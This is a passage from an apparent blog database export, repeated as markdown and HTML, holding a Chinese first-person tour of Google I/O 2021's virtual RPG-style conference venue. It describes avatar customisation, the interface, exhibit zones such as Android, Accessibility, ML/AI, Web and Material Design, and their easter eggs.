4-13-55-51-image.png)\n\n罗列了一下地图中所有的产品圆顶屋（名称按字典排序）：\n\n| 名称                   | 方位  |\n| -------------------- | --- |\n| Android              | 南   |\n| Accessibility        | 东南  |\n| ARCore               | 西南  |\n| Flutter              | 西南  |\n| Firebase             | 东北  |\n| Google Maps Platform | 西南  |\n| Google Assistant     | 北   |\n| Google Cloud         | 东北  |\n| Google Pay           | 东北  |\n| Material Design      | 东南  |\n| ML / AI              | 西   |\n| Web                  | 东   |\n\nOK，我们现在正式开始探索几个主要的展区。在逛第一个展区之前，我们先了解下乐园的UI。\n\n点击左上角的小地图，右边栏就会展开各区的快捷传送菜单，懒人必备哦！到达目的地之后，屏幕中央会显示操作提示，这个时候需要点一下以便选中角色（有高亮描边），然后才能用方向键控制。\n\n![](2021-05-24-23-16-51-image.png)\n\n这个界面总体来说比较简单，就像小时候玩的摩尔庄园一样。左上角小地图旁有一个背景音乐的开关，有趣的是，我用市面上的听歌识曲没有识别出来这悠扬的BGM是什么（大家有兴趣可以去挖掘一下）。左下角有个拍照按钮，拍完之后可以下载到本地。底部是动作表情栏，点击之后头顶会显示相应的表情，可与其他人进行简单的互动。\n\n可以看到，我目前没有聊天的权限，好久之前就注册过参会者了，然而还是没有效果，我估计是语言和地区的原因。\n\n最右边呢就是一些工具栏了，可以修改自己的装饰，查看自己的参会铭牌，日程表等等。\n\n![](2021-05-24-23-42-00-image.png)\n\n系统设置选项还不少，深色模式和离线模式比较人性化。后面也有八国语言的设置，还能退出或者删除当前角色。\n\n![](2021-05-24-23-45-09-image.png)\n\n与NPC，哦不，是与Google员工对话的方式就是**靠近ta**，会自动弹出对话框，查看展台的展品或者详情介绍也是靠近即可。发现一个小彩蛋，在随意触碰几个展品后，还**解锁了成就**，不知道凑齐了是个什么。\n\n![](2021-05-24-23-50-32-image.png)\n\n## Android展区\n\n逛了一圈Android展区下来，发现**Android for Cars**占了很大一块区域，或许这就是风口吧，以后落魄的Android开发可以去搞车载应用的开发了。现在大多数**车机系统**也都是基于Android的。\n\n![](2021-05-24-23-57-38-image.png)\n\n看，这儿还专门给宝马留了一块区域呢。车子的展台占了正中间的好地方。除此之外，周围分别有：**Android 12、Wear OS、TV、Google Play、Jetpack**展台，这些都是Android技术团队近年来大力推广的东西吧。\n\n瞧这边展台还能看见**Kotlin**语言的小模型，细节细节。\n\n![](2021-05-25-00-08-12-image.png)\n\n在Android 12展台的旁边，我还发现了一个有趣的玩意儿：**I/O照相亭**，不知道是什么东西，点进去看看。\n\n![](2021-05-25-00-10-03-image.png)\n\n噢，原来是用Flutter开发的一个Web应用（会获取摄像头权限），类似于街边那种自拍证件照的小屋子。有点意思，地址在这里：[I/O Photo Booth](https://photobooth.flutter.dev/#/)\n\n![](2021-05-25-00-11-36-image.png)\n\n每个展台都有很多的**文章、视频**链接，NPC的**对话内容**也千奇百怪，可以说内容丰富程度不亚于线下大会。正当我准备离开Android展区时，触发了一个**1000步**数的成就，自动弹出了成就奖励，一个哑铃。好家伙，这是要我举着哑铃看展子吗？\n\n![](2021-05-24-23-56-14-image.png)\n\n## 无障碍展区\n\n来到无障碍展区，也能发现不少小惊喜。看见右边那个戴紫色帽子的哥们儿了吗？靠近他会显示他的名字：**DOM窃贼**。他想偷右下角那个玻璃柜里的无障碍标志纪念品。\n\n这虚拟大会上竟然也有盗窃犯，有点真实……\n\n![](2021-05-25-00-20-59-image.png)\n\n没想到这大半夜的，还能碰见其他活人，这种头顶有一串名字的，就是和我一样的线上参会者，他们一般也会四处蹦跶，很容易认出来。\n\n看见左下角那个**宝箱**了吗？被我打开了，里面也会有一些纪念品。刚开始没注意到，后来发现每个展区都有这种宝箱。\n\n![](2021-05-25-00-26-10-image.png)\n\nGoogle这些年在无障碍上面还是下了不少功夫，才赶上了苹果的用户体验，让残障人士也能独立使用科技产品。一开始在Android系统上发力，目前已经做得比较成熟了，国内的手机厂商也逐渐开始重视并适配，以致于不少开发者拿着Accessibility的API搞黑科技。\n\n最近一两年业内又开始完善Web应用的**无障碍功能**，相信以后各端的无障碍体验都能对残障人士越来越友好吧。各位开发者也不要嫌麻烦适配，这个和多语言、RTL类似，是产品走向人性化的必经之路。\n\n## ML / AI展区\n\n机器学习与人工智能展区，TensorFlow框架相关的内容占了绝大部分，包括**TensorFlow Lite、TensorFlow.js、TensorFlow Core**等。中间区域是一个神经网络的模型，还算比较有代表性吧。\n\n![](2021-05-25-01-58-40-image.png)\n\n开宝箱得了个**TF的法杖**，看来搞机器学习果然是炼丹哦。继续往里面走，穿过整个展区来到室外，可以看见一片草地，这里有很多挂着乐器的树，碰撞它们也会有变幻彩蛋。\n\n![](2021-05-25-02-04-44-image.png)\n\n现在AI涉足的领域真的很多，在艺术方面的应用，比如生成音乐、作词作曲、乐器演奏等。当然，这种创造性的工作，还是人和机器相辅相成更妙，完全依赖任一方都不太合适。\n\n## Web展区\n\nWeb展区主要是**浏览器、前端开发、搜索**相关的技术了。这个展区应该是最热闹的了，毕竟前端开发者是数量也比较大。正如这个**Chrome**标志牌一样非常令人瞩目。\n\n![](2021-05-25-01-51-33-image.png)\n\n展区中间有一个**Lighthouse测试**，可以分析网站的性能、**SEO**等等，嘿嘿，试了一下**少数派**的域名，得分还可以，就是SEO这项有点低。\n\n![](2021-05-25-01-34-50-image.png)\n\n这里还发现一份SEO入门指南，打开后还特意提示“很长”，真是贴心哦，太长不看。前端的花样真的多，这个展区还介绍了很多我没听说过的API和开发框架。\n\n![](2021-05-25-01-44-11-image.png)\n\n展区最右边出现了熟悉的Chrome小游戏恐龙，我看它一直在这蹦跶，像是被关在这出不去了。Google说好的不作恶呢？连恐龙都敢囚禁。\n\n![](2021-05-25-01-48-58-image.png)\n\n## Material Design展区\n\nMD是Google官方的设计语言。让我意外的是，MD展区的参会人还挺多的，遇见好几个蹦来蹦去的（还有妹子角色）。看来设计师们也对IO大会很感兴趣哦！\n\n这里发现一个小彩蛋，中间有个**大花坛**，周围有4个圆凳一样的东西，碰它们，中间的花朵会发生变幻。\n\n![](2021-05-25-01-10-57-image.png)\n\n如今Material Design也可以用于**WordPress**，感觉有很多年没玩过这个博客框架了。\n\n![](2021-05-25-01-18-00-image.png)\n\n## 其他小细节\n\n上面逛的基本上也是我感兴趣的几个，还有好多其他展区就不带大家走马观花咯！其实每个展区的内容都非常棒，Google以最生动的形式给大家科普了他们家前沿的IT技术，仔细探索会发现很多有趣的彩蛋。\n\n我目前体验到的比较明显的：\n\n- Android展区的北边，相当于整个乐园的中心，有高尔夫球场。这有个哥们儿在乐此不彼地打高尔夫。\n\n![](2021-05-25-02-07-43-image.png)\n\n- 除了通过方向键和地图快捷传送来移动角色以外，按Tab键还会有Waypoints，连续按可以切换不同的提示，以便在展区内快速移动到不同的展台。\n\n![](2021-05-25-00-56-11-image.png)\n\n- 每个展区最中间区域大概都是BGM的音源位置，声音最大，如果走到边缘区域，声音就会变小，即立体音效。\n\n- 撞到墙的话，会有音效，听起来很像撞到了纸板或木板的声音，完全模拟了线下这种展会所用的临时墙体材料。\n\n- 路边的小铺基本都是可以交互的，比如这个卖茶的，饿了可以吃吃喝喝。\n\n![](2021-05-25-02-15-23-image.png)\n\n- 某些展区的电视旁边的招牌只显示一个汉字，这个可能是个翻译或者显示的Bug。比如下面这个，英文显示的是Mobile。\n\n![](2021-05-25-00-58-46-image.png)\n\n- 网页太久失去焦点，角色会睡着，看下面这个家伙就睡着挂机了。挂机太久会踢你下线，再回来需要重新连接。\n\n![](2021-05-25-00-49-08-image.png)\n\n乐园实在太大，更多的彩蛋细节，还是大家慢慢去发掘了。上面不少有趣的地方都在地图的体验区当中。\n\n![](2021-05-25-13-38-12-image.png)\n\n最后整理一下每个展区的具体内容吧：\n\n| 名称                   | 内容                                                       |\n| -------------------- | -------------------------------------------------------- |\n| Android              | Android 12、Wear、Cars、TV、Google Play、MAD、Jetpack Compose  |\n| Accessibility        | Inspire（启迪区）、Empower（赋能区，包括Web支持等）                       |\n| ARCore               | Recording & Playback API、Cloud Anchors API、Depth API     |\n| Flutter              | 使用入门、With Google、Dart、跨平台                                |\n| Firebase             | 演示区、CodeLab                                              |\n| Google Maps Platform | 使用入门、Mobile、Web                                          |\n| Google Assistant     | Etsy、eBay、Twitter、Strava                                 |\n| Google Cloud         | Cloud、工作区和AppSheet、数据与AI、App Dev Booth                   |\n| Google Pay           | 工具和库、安全、Pay的新增功能、Android                                 |\n| Material Design      | Design、Web、Android                                       |\n| ML / AI              | Cloud AI、TF Lite、TF Core、TF.js                           |\n| Web                  | Fugu、Angular、Core Web Vitals、PWA、搜索、性能、DevTools、安全、隐私与验证 |\n","source":"_posts/2021-06-16-我的2021 Google IO大会之旅.md","raw":"---\nlayout:     post\ntitle:      我的2021 Google IO大会之旅\nsubtitle:   一次特别的会议。\ndate:       2021-06-16\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n此文为初稿备份，终稿已发布于少数派：[https://sspai.com/post/66830](https://sspai.com/post/66830)\n\n---\n\n2021年的 [Google I/O大会](https://events.google.com/io/about/?lng=zh-CN) 已经圆满闭幕，我们从下面几条官方的FAQ可以看出今年大会与往届有所不同：\n\n- 2021年Google I/O大会主要面向哪些人群？\n\n  全球范围内对Google技术感兴趣的开发者都应关注此次大会，以便了解最新的产品发布、Google专家的行业洞见，并进行实践性学习。\n\n- Google I/O 2021大会的举办时间和地点？\n\n  2021年开发者大会将于5月18日至20日以**虚拟形式**举办。\n\n- Google I/O 2021大会的费用是多少？\n\n  本届Google I/O大会对所有人免费，包括会上那些需要预约的内容，我们希望人人都能参与其中并从中获益。\n\n我觉得最有意思的就是这个线上虚拟大会，这基本上就是一个完整的在线RPG游戏。我相信这也是全世界大多数开发者人生中第一次“亲临”IO大会现场。\n\n![](2021-05-24-13-46-41-image.png)\n\n接下来我就带大家一起逛逛这次有趣的大会吧。\n\n## 初入乐园\n\n刚进入加载页面的时候，我们就能看见背景是整个大会的像素风地图全貌，可以看见内容还是蛮多的，有Android展区、Web展区、AI展区、Flutter展区、无障碍（Accessibility）展区等等。这真的好像一个游乐园啊，姑且请我称之为“**乐园**”，哈哈哈！\n\n![](2021-05-24-13-53-24-image.png)\n\n在加载过程中，会有排队等待、下载地图资源等提示，和游戏服务器一样的，进入之后会看见自己所处的线路。\n\n首次进入乐园需要定制自己角色的外观，包括左右手的**装饰、头饰、肤色、体型、发型**等，选项真的还不少呢，方脑袋、圆脑壳、瓜子脸应有尽有……从选项也可见大会的包容性还是很强的，不管你是四肢健全还是残障人士，都有选择（无障碍也是本次大会的一个主题之一）。\n\n![](2021-05-24-15-07-48-image.png)\n\n你可以扮演一个喝饮料的小朋友，可以扮演一个摄影爱好者，可以扮演一个做笔记的记者，也可以扮演一个到处搜集大会宣传资料的收藏家，这都取决于你的定制。\n\n![](2021-05-24-15-12-56-image.png)\n\n我能想象到的发色，这里面基本都有了。你甚至可以头上整点儿绿（无意间发现帽子和头发的选择居然有29项之多，实在是细），当然我还是选个中规中矩的黑色吧！\n\n![](2021-05-24-15-11-44-image.png)\n\n定制好角色之后，我第一件感兴趣的事情，就是看看这整个乐园是不是**无缝地图**，这大概是我的RPG游戏后遗症。操作角色的方法很简单，就是方向键控制移动。然后当我从一个展区（官方称之为“产品圆顶屋”）移动到另一个展区时，发现地图是需要重新加载的，看来并不是无缝的。\n\n不过，这也说明乐园整体是很大的，考虑到**性能问题**，不方便一次性加载。所以应该会有很多**彩蛋**等我们发掘。\n\n![](2021-05-24-13-55-51-image.png)\n\n罗列了一下地图中所有的产品圆顶屋（名称按字典排序）：\n\n| 名称                   | 方位  |\n| -------------------- | --- |\n| Android              | 南   |\n| Accessibility        | 东南  |\n| ARCore               | 西南  |\n| Flutter              | 西南  |\n| Firebase             | 东北  |\n| Google Maps Platform | 西南  |\n| Google Assistant     | 北   |\n| Google Cloud         | 东北  |\n| Google Pay           | 东北  |\n| Material Design      | 东南  |\n| ML / AI              | 西   |\n| Web                  | 东   |\n\nOK，我们现在正式开始探索几个主要的展区。在逛第一个展区之前，我们先了解下乐园的UI。\n\n点击左上角的小地图，右边栏就会展开各区的快捷传送菜单，懒人必备哦！到达目的地之后，屏幕中央会显示操作提示，这个时候需要点一下以便选中角色（有高亮描边），然后才能用方向键控制。\n\n![](2021-05-24-23-16-51-image.png)\n\n这个界面总体来说比较简单，就像小时候玩的摩尔庄园一样。左上角小地图旁有一个背景音乐的开关，有趣的是，我用市面上的听歌识曲没有识别出来这悠扬的BGM是什么（大家有兴趣可以去挖掘一下）。左下角有个拍照按钮，拍完之后可以下载到本地。底部是动作表情栏，点击之后头顶会显示相应的表情，可与其他人进行简单的互动。\n\n可以看到，我目前没有聊天的权限，好久之前就注册过参会者了，然而还是没有效果，我估计是语言和地区的原因。\n\n最右边呢就是一些工具栏了，可以修改自己的装饰，查看自己的参会铭牌，日程表等等。\n\n![](2021-05-24-23-42-00-image.png)\n\n系统设置选项还不少，深色模式和离线模式比较人性化。后面也有八国语言的设置，还能退出或者删除当前角色。\n\n![](2021-05-24-23-45-09-image.png)\n\n与NPC，哦不，是与Google员工对话的方式就是**靠近ta**，会自动弹出对话框，查看展台的展品或者详情介绍也是靠近即可。发现一个小彩蛋，在随意触碰几个展品后，还**解锁了成就**，不知道凑齐了是个什么。\n\n![](2021-05-24-23-50-32-image.png)\n\n## Android展区\n\n逛了一圈Android展区下来，发现**Android for Cars**占了很大一块区域，或许这就是风口吧，以后落魄的Android开发可以去搞车载应用的开发了。现在大多数**车机系统**也都是基于Android的。\n\n![](2021-05-24-23-57-38-image.png)\n\n看，这儿还专门给宝马留了一块区域呢。车子的展台占了正中间的好地方。除此之外，周围分别有：**Android 12、Wear OS、TV、Google Play、Jetpack**展台，这些都是Android技术团队近年来大力推广的东西吧。\n\n瞧这边展台还能看见**Kotlin**语言的小模型，细节细节。\n\n![](2021-05-25-00-08-12-image.png)\n\n在Android 12展台的旁边，我还发现了一个有趣的玩意儿：**I/O照相亭**，不知道是什么东西，点进去看看。\n\n![](2021-05-25-00-10-03-image.png)\n\n噢，原来是用Flutter开发的一个Web应用（会获取摄像头权限），类似于街边那种自拍证件照的小屋子。有点意思，地址在这里：[I/O Photo Booth](https://photobooth.flutter.dev/#/)\n\n![](2021-05-25-00-11-36-image.png)\n\n每个展台都有很多的**文章、视频**链接，NPC的**对话内容**也千奇百怪，可以说内容丰富程度不亚于线下大会。正当我准备离开Android展区时，触发了一个**1000步**数的成就，自动弹出了成就奖励，一个哑铃。好家伙，这是要我举着哑铃看展子吗？\n\n![](2021-05-24-23-56-14-image.png)\n\n## 无障碍展区\n\n来到无障碍展区，也能发现不少小惊喜。看见右边那个戴紫色帽子的哥们儿了吗？靠近他会显示他的名字：**DOM窃贼**。他想偷右下角那个玻璃柜里的无障碍标志纪念品。\n\n这虚拟大会上竟然也有盗窃犯，有点真实……\n\n![](2021-05-25-00-20-59-image.png)\n\n没想到这大半夜的，还能碰见其他活人，这种头顶有一串名字的，就是和我一样的线上参会者，他们一般也会四处蹦跶，很容易认出来。\n\n看见左下角那个**宝箱**了吗？被我打开了，里面也会有一些纪念品。刚开始没注意到，后来发现每个展区都有这种宝箱。\n\n![](2021-05-25-00-26-10-image.png)\n\nGoogle这些年在无障碍上面还是下了不少功夫，才赶上了苹果的用户体验，让残障人士也能独立使用科技产品。一开始在Android系统上发力，目前已经做得比较成熟了，国内的手机厂商也逐渐开始重视并适配，以致于不少开发者拿着Accessibility的API搞黑科技。\n\n最近一两年业内又开始完善Web应用的**无障碍功能**，相信以后各端的无障碍体验都能对残障人士越来越友好吧。各位开发者也不要嫌麻烦适配，这个和多语言、RTL类似，是产品走向人性化的必经之路。\n\n## ML / AI展区\n\n机器学习与人工智能展区，TensorFlow框架相关的内容占了绝大部分，包括**TensorFlow Lite、TensorFlow.js、TensorFlow Core**等。中间区域是一个神经网络的模型，还算比较有代表性吧。\n\n![](2021-05-25-01-58-40-image.png)\n\n开宝箱得了个**TF的法杖**，看来搞机器学习果然是炼丹哦。继续往里面走，穿过整个展区来到室外，可以看见一片草地，这里有很多挂着乐器的树，碰撞它们也会有变幻彩蛋。\n\n![](2021-05-25-02-04-44-image.png)\n\n现在AI涉足的领域真的很多，在艺术方面的应用，比如生成音乐、作词作曲、乐器演奏等。当然，这种创造性的工作，还是人和机器相辅相成更妙，完全依赖任一方都不太合适。\n\n## Web展区\n\nWeb展区主要是**浏览器、前端开发、搜索**相关的技术了。这个展区应该是最热闹的了，毕竟前端开发者是数量也比较大。正如这个**Chrome**标志牌一样非常令人瞩目。\n\n![](2021-05-25-01-51-33-image.png)\n\n展区中间有一个**Lighthouse测试**，可以分析网站的性能、**SEO**等等，嘿嘿，试了一下**少数派**的域名，得分还可以，就是SEO这项有点低。\n\n![](2021-05-25-01-34-50-image.png)\n\n这里还发现一份SEO入门指南，打开后还特意提示“很长”，真是贴心哦，太长不看。前端的花样真的多，这个展区还介绍了很多我没听说过的API和开发框架。\n\n![](2021-05-25-01-44-11-image.png)\n\n展区最右边出现了熟悉的Chrome小游戏恐龙，我看它一直在这蹦跶，像是被关在这出不去了。Google说好的不作恶呢？连恐龙都敢囚禁。\n\n![](2021-05-25-01-48-58-image.png)\n\n## Material Design展区\n\nMD是Google官方的设计语言。让我意外的是，MD展区的参会人还挺多的，遇见好几个蹦来蹦去的（还有妹子角色）。看来设计师们也对IO大会很感兴趣哦！\n\n这里发现一个小彩蛋，中间有个**大花坛**，周围有4个圆凳一样的东西，碰它们，中间的花朵会发生变幻。\n\n![](2021-05-25-01-10-57-image.png)\n\n如今Material Design也可以用于**WordPress**，感觉有很多年没玩过这个博客框架了。\n\n![](2021-05-25-01-18-00-image.png)\n\n## 其他小细节\n\n上面逛的基本上也是我感兴趣的几个，还有好多其他展区就不带大家走马观花咯！其实每个展区的内容都非常棒，Google以最生动的形式给大家科普了他们家前沿的IT技术，仔细探索会发现很多有趣的彩蛋。\n\n我目前体验到的比较明显的：\n\n- Android展区的北边，相当于整个乐园的中心，有高尔夫球场。这有个哥们儿在乐此不彼地打高尔夫。\n\n![](2021-05-25-02-07-43-image.png)\n\n- 除了通过方向键和地图快捷传送来移动角色以外，按Tab键还会有Waypoints，连续按可以切换不同的提示，以便在展区内快速移动到不同的展台。\n\n![](2021-05-25-00-56-11-image.png)\n\n- 每个展区最中间区域大概都是BGM的音源位置，声音最大，如果走到边缘区域，声音就会变小，即立体音效。\n\n- 撞到墙的话，会有音效，听起来很像撞到了纸板或木板的声音，完全模拟了线下这种展会所用的临时墙体材料。\n\n- 路边的小铺基本都是可以交互的，比如这个卖茶的，饿了可以吃吃喝喝。\n\n![](2021-05-25-02-15-23-image.png)\n\n- 某些展区的电视旁边的招牌只显示一个汉字，这个可能是个翻译或者显示的Bug。比如下面这个，英文显示的是Mobile。\n\n![](2021-05-25-00-58-46-image.png)\n\n- 网页太久失去焦点，角色会睡着，看下面这个家伙就睡着挂机了。挂机太久会踢你下线，再回来需要重新连接。\n\n![](2021-05-25-00-49-08-image.png)\n\n乐园实在太大，更多的彩蛋细节，还是大家慢慢去发掘了。上面不少有趣的地方都在地图的体验区当中。\n\n![](2021-05-25-13-38-12-image.png)\n\n最后整理一下每个展区的具体内容吧：\n\n| 名称                   | 内容                                                       |\n| -------------------- | -------------------------------------------------------- |\n| Android              | Android 12、Wear、Cars、TV、Google Play、MAD、Jetpack Compose  |\n| Accessibility        | Inspire（启迪区）、Empower（赋能区，包括Web支持等）                       |\n| ARCore               | Recording & Playback API、Cloud Anchors API、Depth API     |\n| Flutter              | 使用入门、With Google、Dart、跨平台                                |\n| Firebase             | 演示区、CodeLab                                              |\n| Google Maps Platform | 使用入门、Mobile、Web                                          |\n| Google Assistant     | Etsy、eBay、Twitter、Strava                                 |\n| Google Cloud         | Cloud、工作区和AppSheet、数据与AI、App Dev Booth                   |\n| Google Pay           | 工具和库、安全、Pay的新增功能、Android                                 |\n| Material Design      | Design、Web、Android                                       |\n| ML / AI              | Cloud AI、TF Lite、TF Core、TF.js                           |\n| Web                  | Fugu、Angular、Core Web Vitals、PWA、搜索、性能、DevTools、安全、隐私与验证 |\n","slug":"我的2021 Google IO大会之旅","published":1,"updated":"2024-03-25T07:31:25.866Z","comments":1,"photos":[],"link":"","_id":"cluaufh1a003uthe66vn45ryp","content":"<p>此文为初稿备份，终稿已发布于少数派：<a href=\"https://sspai.com/post/66830\">https://sspai.com/post/66830</a></p>\n<hr>\n<p>2021年的 <a href=\"https://events.google.com/io/about/?lng=zh-CN\">Google I&#x2F;O大会</a> 已经圆满闭幕，我们从下面几条官方的FAQ可以看出今年大会与往届有所不同：</p>\n<ul>\n<li><p>2021年Google I&#x2F;O大会主要面向哪些人群？</p>\n<p>全球范围内对Google技术感兴趣的开发者都应关注此次大会，以便了解最新的产品发布、Google专家的行业洞见，并进行实践性学习。</p>\n</li>\n<li><p>Google I&#x2F;O 2021大会的举办时间和地点？</p>\n<p>2021年开发者大会将于5月18日至20日以<strong>虚拟形式</strong>举办。</p>\n</li>\n<li><p>Google I&#x2F;O 2021大会的费用是多少？</p>\n<p>本届Google I&#x2F;O大会对所有人免费，包括会上那些需要预约的内容，我们希望人人都能参与其中并从中获益。</p>\n</li>\n</ul>\n<p>我觉得最有意思的就是这个线上虚拟大会，这基本上就是一个完整的在线RPG游戏。我相信这也是全世界大多数开发者人生中第一次“亲临”IO大会现场。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-13-46-41-image.png\"></p>\n<p>接下来我就带大家一起逛逛这次有趣的大会吧。</p>\n<h2 id=\"初入乐园\"><a href=\"#初入乐园\" class=\"headerlink\" title=\"初入乐园\"></a>初入乐园</h2><p>刚进入加载页面的时候，我们就能看见背景是整个大会的像素风地图全貌，可以看见内容还是蛮多的，有Android展区、Web展区、AI展区、Flutter展区、无障碍（Accessibility）展区等等。这真的好像一个游乐园啊，姑且请我称之为“<strong>乐园</strong>”，哈哈哈！</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-13-53-24-image.png\"></p>\n<p>在加载过程中，会有排队等待、下载地图资源等提示，和游戏服务器一样的，进入之后会看见自己所处的线路。</p>\n<p>首次进入乐园需要定制自己角色的外观，包括左右手的<strong>装饰、头饰、肤色、体型、发型</strong>等，选项真的还不少呢，方脑袋、圆脑壳、瓜子脸应有尽有……从选项也可见大会的包容性还是很强的，不管你是四肢健全还是残障人士，都有选择（无障碍也是本次大会的一个主题之一）。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-15-07-48-image.png\"></p>\n<p>你可以扮演一个喝饮料的小朋友，可以扮演一个摄影爱好者，可以扮演一个做笔记的记者，也可以扮演一个到处搜集大会宣传资料的收藏家，这都取决于你的定制。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-15-12-56-image.png\"></p>\n<p>我能想象到的发色，这里面基本都有了。你甚至可以头上整点儿绿（无意间发现帽子和头发的选择居然有29项之多，实在是细），当然我还是选个中规中矩的黑色吧！</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-15-11-44-image.png\"></p>\n<p>定制好角色之后，我第一件感兴趣的事情，就是看看这整个乐园是不是<strong>无缝地图</strong>，这大概是我的RPG游戏后遗症。操作角色的方法很简单，就是方向键控制移动。然后当我从一个展区（官方称之为“产品圆顶屋”）移动到另一个展区时，发现地图是需要重新加载的，看来并不是无缝的。</p>\n<p>不过，这也说明乐园整体是很大的，考虑到<strong>性能问题</strong>，不方便一次性加载。所以应该会有很多<strong>彩蛋</strong>等我们发掘。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-13-55-51-image.png\"></p>\n<p>罗列了一下地图中所有的产品圆顶屋（名称按字典排序）：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>方位</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Android</td>\n<td>南</td>\n</tr>\n<tr>\n<td>Accessibility</td>\n<td>东南</td>\n</tr>\n<tr>\n<td>ARCore</td>\n<td>西南</td>\n</tr>\n<tr>\n<td>Flutter</td>\n<td>西南</td>\n</tr>\n<tr>\n<td>Firebase</td>\n<td>东北</td>\n</tr>\n<tr>\n<td>Google Maps Platform</td>\n<td>西南</td>\n</tr>\n<tr>\n<td>Google Assistant</td>\n<td>北</td>\n</tr>\n<tr>\n<td>Google Cloud</td>\n<td>东北</td>\n</tr>\n<tr>\n<td>Google Pay</td>\n<td>东北</td>\n</tr>\n<tr>\n<td>Material Design</td>\n<td>东南</td>\n</tr>\n<tr>\n<td>ML &#x2F; AI</td>\n<td>西</td>\n</tr>\n<tr>\n<td>Web</td>\n<td>东</td>\n</tr>\n</tbody></table>\n<p>OK，我们现在正式开始探索几个主要的展区。在逛第一个展区之前，我们先了解下乐园的UI。</p>\n<p>点击左上角的小地图，右边栏就会展开各区的快捷传送菜单，懒人必备哦！到达目的地之后，屏幕中央会显示操作提示，这个时候需要点一下以便选中角色（有高亮描边），然后才能用方向键控制。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-16-51-image.png\"></p>\n<p>这个界面总体来说比较简单，就像小时候玩的摩尔庄园一样。左上角小地图旁有一个背景音乐的开关，有趣的是，我用市面上的听歌识曲没有识别出来这悠扬的BGM是什么（大家有兴趣可以去挖掘一下）。左下角有个拍照按钮，拍完之后可以下载到本地。底部是动作表情栏，点击之后头顶会显示相应的表情，可与其他人进行简单的互动。</p>\n<p>可以看到，我目前没有聊天的权限，好久之前就注册过参会者了，然而还是没有效果，我估计是语言和地区的原因。</p>\n<p>最右边呢就是一些工具栏了，可以修改自己的装饰，查看自己的参会铭牌，日程表等等。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-42-00-image.png\"></p>\n<p>系统设置选项还不少，深色模式和离线模式比较人性化。后面也有八国语言的设置，还能退出或者删除当前角色。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-45-09-image.png\"></p>\n<p>与NPC，哦不，是与Google员工对话的方式就是<strong>靠近ta</strong>，会自动弹出对话框，查看展台的展品或者详情介绍也是靠近即可。发现一个小彩蛋，在随意触碰几个展品后，还<strong>解锁了成就</strong>，不知道凑齐了是个什么。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-50-32-image.png\"></p>\n<h2 id=\"Android展区\"><a href=\"#Android展区\" class=\"headerlink\" title=\"Android展区\"></a>Android展区</h2><p>逛了一圈Android展区下来，发现<strong>Android for Cars</strong>占了很大一块区域，或许这就是风口吧，以后落魄的Android开发可以去搞车载应用的开发了。现在大多数<strong>车机系统</strong>也都是基于Android的。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-57-38-image.png\"></p>\n<p>看，这儿还专门给宝马留了一块区域呢。车子的展台占了正中间的好地方。除此之外，周围分别有：<strong>Android 12、Wear OS、TV、Google Play、Jetpack</strong>展台，这些都是Android技术团队近年来大力推广的东西吧。</p>\n<p>瞧这边展台还能看见<strong>Kotlin</strong>语言的小模型，细节细节。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-08-12-image.png\"></p>\n<p>在Android 12展台的旁边，我还发现了一个有趣的玩意儿：<strong>I&#x2F;O照相亭</strong>，不知道是什么东西，点进去看看。</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-10-03-image.png\"></p>\n<p>噢，原来是用Flutter开发的一个Web应用（会获取摄像头权限），类似于街边那种自拍证件照的小屋子。有点意思，地址在这里：<a href=\"https://photobooth.flutter.dev/#/\">I&#x2F;O Photo Booth</a></p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-25-00-11-36-image.png\"></p>\n<p>每个展台都有很多的<strong>文章、视频</strong>链接，NPC的<strong>对话内容</strong>也千奇百怪，可以说内容丰富程度不亚于线下大会。正当我准备离开Android展区时，触发了一个<strong>1000步</strong>数的成就，自动弹出了成就奖励，一个哑铃。好家伙，这是要我举着哑铃看展子吗？</p>\n<p><img src=\"/2021/06/16/%E6%88%91%E7%9A%842021%20Google%20IO%E5%A4%A7%E4%BC%9A%E4%B9%8B%E6%97%85/2021-05-24-23-56-14-image.png\"></p>\n<h2 id=\"无障碍展区\"><a href=\"#无障碍展区\" class=\"headerlink\" 